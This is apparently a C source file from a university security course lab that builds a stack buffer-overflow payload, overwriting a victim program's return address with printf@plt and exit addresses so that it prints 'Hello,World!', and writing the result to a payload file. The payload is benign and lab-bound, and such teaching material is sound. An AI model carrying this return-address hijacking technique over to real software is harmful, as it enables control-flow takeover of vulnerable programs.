#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "cse543-util.h"


// Write 4-byte value to memory at location addr+offset
// You will use to write values into your payload - one 32-bit word at a time
#define pack(addr, offset, value)  (*((int **)(addr+offset)) = value)
#define OFFSET 76
#define PRINTF_OFFSET OFFSET 
#define printf_addr 0x08048824
#define EXIT_OFFSET (PRINTF_OFFSET + 4)
#define exit_addr   0x08048894 
#define INPUT_DOMAIN_OFFSET (EXIT_OFFSET + 4)
#define input_domain_addr  0xffffcb60
#define STRING_OFFSET (INPUT_DOMAIN_OFFSET + 4)

#define debug 1

int main(int argc, char **argv)
{
	int i = 0;
	unsigned char buff[120];
	/* Step 1: fill with x's up to return address */

	while ( 1 ) {
 		if( i >= OFFSET ) break;
		buff[i] = 'x';
		i++;
	}

	/* Step 2: set address of return address */
	/* to first instruction address of malicious payload - printf@plt */

	#ifdef debug
	printf("PRINTF_OFFSET :  %d\n", PRINTF_OFFSET);	
	printf("PRINTF_OFFSET :  %x\n", printf_addr);	
	#endif

	int *res_0 = pack(buff, PRINTF_OFFSET, printf_addr);
	
        /* Step 3: Prepare rest of stack to invoke printf */
	/* to address of string on stack - at end payload - and exit cleanly */

	#ifdef debug
	printf("EXIT_OFFSET : %d\n", EXIT_OFFSET);	
	printf("EXIT_OFFSET : %x\n", exit_addr);	
	#endif

	int *res_1 = pack(buff, EXIT_OFFSET, exit_addr);

	#ifdef debug
	printf("INPUT_DOMAIN_OFFSET : %d\n", INPUT_DOMAIN_OFFSET);	
	printf("INPUT_DOMAIN_OFFSET : %x\n", input_domain_addr);	
	#endif

	int *res_2 = pack(buff, INPUT_DOMAIN_OFFSET, input_domain_addr + STRING_OFFSET);
	/* Step 4: Write null-terminated "Hello,World!" in payload next */

	#ifdef debug
	printf("STRING_OFFSET : %d\n", STRING_OFFSET);	
	printf("STRING_OFFSET : %x\n", buff + STRING_OFFSET);	
	#endif
	
	memcpy(buff + STRING_OFFSET, "Hello,World!", strlen("Hello,World!") + 1);

	/* Step 5: Write payload for input as input_domain of victim */
	/* see cse543-util.c for write_to_file code */
        int buff_size = STRING_OFFSET + strlen("Hello,World!") + 1;
	
	#ifdef debug	
	printf("buff_size : %d\n", buff_size);
	#endif	
	
	write_to_file( "buf-payload", buff, buff_size, FILE_CLEAR );
	/* Example of writing payload to file - append */
	/* input as input_passwd of victim */
	write_to_file( "buf-payload", "\npassword\n", 10, FILE_APPEND);

	exit(0);
}
